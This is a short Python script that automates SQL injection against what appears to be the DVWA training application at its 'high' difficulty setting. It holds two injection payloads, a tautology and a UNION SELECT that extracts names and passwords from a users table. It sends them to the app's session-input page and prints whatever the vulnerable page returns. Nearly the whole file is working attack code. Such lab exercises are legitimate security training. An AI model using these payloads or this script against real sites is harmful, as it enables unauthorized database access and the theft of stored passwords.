#!/usr/bin/env python3

import requests
from bs4 import BeautifulSoup

from conf import BASE_URL
from util import http_get, http_post

DIFFICULTY = "high"

PAYLOADS = [
    "' OR 1=1 -- ",
    "' UNION SELECT first_name, password FROM users # "
]

# -----------------------

def sqli_high():
    global BASE_URL, DIFFICULTY, PAYLOADS

    print("==================================")
    print(f"[INFO] - SQLi {DIFFICULTY}")    
    
    for payload in PAYLOADS:
        # -- request to change app state
        url = BASE_URL + "/vulnerabilities/sqli/session-input.php"
        post_data = f"id={payload}&Submit=Submit"
        r = http_post(url, DIFFICULTY, data=post_data)

        # -- check if the input triggered an SQLi
        url = BASE_URL + "/vulnerabilities/sqli/"
        r = http_get(url, DIFFICULTY)
        
        soup = BeautifulSoup(r.text, "html.parser")
        div = soup.find("div", {"class": "vulnerable_code_area"})
        if div:
            print("----------------------------------")            
            print(f"[SUCCESS]")
            print(f"payload = !{payload}!")

            for elem in div.find_all("pre"):
                print(elem)
